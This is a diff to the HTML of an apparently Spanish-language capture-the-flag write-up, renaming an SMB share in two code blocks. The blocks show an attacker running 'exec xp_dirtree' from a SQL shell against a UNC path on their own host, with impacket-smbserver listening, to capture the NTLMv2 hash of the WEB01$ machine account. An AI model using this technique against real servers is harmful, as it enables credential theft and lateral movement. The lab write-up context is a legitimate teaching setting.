@@ -271,13 +271,13 @@ sql-shell&gt;</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Como curiosidad aunque en este caso no nos sirve de nada si usamos <code class="language-plaintext highlighter-rouge">xp_dirtree</code> hacia un recurso <code class="language-plaintext highlighter-rouge">smb</code> podemos capturar el hash NTLMv2 de el equipo <code class="language-plaintext highlighter-rouge">WEB01$</code></p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">sql-shell&gt; exec xp_dirtree '\\10.10.14.10\kali'
-[</span><span class="az">18:23:48</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] executing SQL data execution statement: 'exec xp_dirtree '\\10.10.14.10\kali''  
-exec xp_dirtree '\\10.10.14.10\kali': 'NULL'
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">sql-shell&gt; exec xp_dirtree '\\10.10.14.10\user'
+[</span><span class="az">18:23:48</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] executing SQL data execution statement: 'exec xp_dirtree '\\10.10.14.10\user''  
+exec xp_dirtree '\\10.10.14.10\user': 'NULL'
 sql-shell&gt;</span>
 </code></pre></div></div><br>
 
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ impacket-smbserver </span><span class="p">kali . -smb2support
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ impacket-smbserver </span><span class="p">user . -smb2support
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] Config file parsed
